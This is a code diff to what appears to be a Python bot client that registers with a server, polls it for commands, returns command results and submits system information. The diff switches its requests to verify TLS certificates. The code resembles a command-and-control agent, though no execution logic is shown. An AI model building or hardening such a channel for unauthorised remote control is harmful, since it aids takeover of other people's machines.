@@ -75,7 +75,7 @@ def send_registration():
         response = requests.post(f"{SERVER_URL}/bot/register",
                                json=system_info,
                                timeout=30,
-                               verify=False)  # Remove in production with proper SSL
+                               verify=True)  # Use proper SSL verification
 
         if response.status_code == 200:
             data = response.json()
@@ -101,7 +101,7 @@ def receive_commands():
         response = requests.get(f"{SERVER_URL}/bot/command/{BOT_ID}",
                               headers=headers,
                               timeout=30,
-                              verify=False)
+                              verify=True)
 
         if response.status_code == 200:
             return response.json()
@@ -125,7 +125,7 @@ def send_command_result(command_id, result):
                                json=data,
                                headers=headers,
                                timeout=30,
-                               verify=False)
+                               verify=True)
 
         if response.status_code == 200:
             print(f"Command result sent successfully for command {command_id}")
@@ -240,7 +240,7 @@ def submit_system_info():
                                json=system_data,
                                headers=headers,
                                timeout=30,
-                               verify=False)
+                               verify=True)
 
         if response.status_code == 200:
             print("System information submitted successfully")
